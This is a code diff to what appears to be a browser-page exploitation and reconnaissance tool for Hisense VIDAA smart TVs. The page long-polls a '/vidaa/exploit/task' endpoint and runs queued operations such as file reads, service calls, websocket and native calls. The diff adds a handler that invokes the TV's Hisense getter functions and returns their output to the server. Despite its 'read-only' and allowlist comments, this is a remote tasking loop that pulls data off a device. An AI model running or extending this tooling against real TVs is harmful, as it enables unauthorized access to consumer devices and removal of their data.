@@ -13,7 +13,8 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
 /* READ-ONLY recon v4 with live task loop.
    After the initial recon pass the page long-polls GET /vidaa/exploit/task
    and executes queued tasks in a FIXED interpreter (ops: fileRead, svc, ws,
-   native, globals, enumerate, sleep, batch) under the same hard allowlist.
+   native, jsapi-getters-only, globals, enumerate, sleep, batch) under the
+   same hard allowlist.
    No eval, no setters, no download-to-TV, no writes - the server validates
    tasks against the same allowlist before queueing them.
    v2/v3 facts on this build: http 9009 + wss 9888 work from browser pages;
@@ -204,6 +205,15 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
       var base2 = op.base || goodBase || BASES[0];
       var r2 = parseVendor(await httpCall(base2, op.svc, op.api, op.args, 6000));
       return { ok: isOk(r2), content: clip(r2 && r2.msg !== undefined ? r2.msg : r2, 6000) };
+    }
+    if (op.op === "jsapi") {
+      if (!/^(?:Hisense_Get|His_get)[A-Za-z0-9_]{0,60}$/.test(op.fn || "")) return { rejected: "jsapi getter-only" };
+      var fn = window[op.fn];
+      if (typeof fn !== "function") return { missing: op.fn };
+      try {
+        var rv = fn.apply(window, op.args || []);
+        return { fn: op.fn, ret: clip(rv, 9000) };
+      } catch (e) { return { fn: op.fn, exc: String(e) }; }
     }
     if (op.op === "native") return nativeCall(op.api, op.args);
     if (op.op === "ws") return await wsRun(op.target, op.messages || [], op.ms);
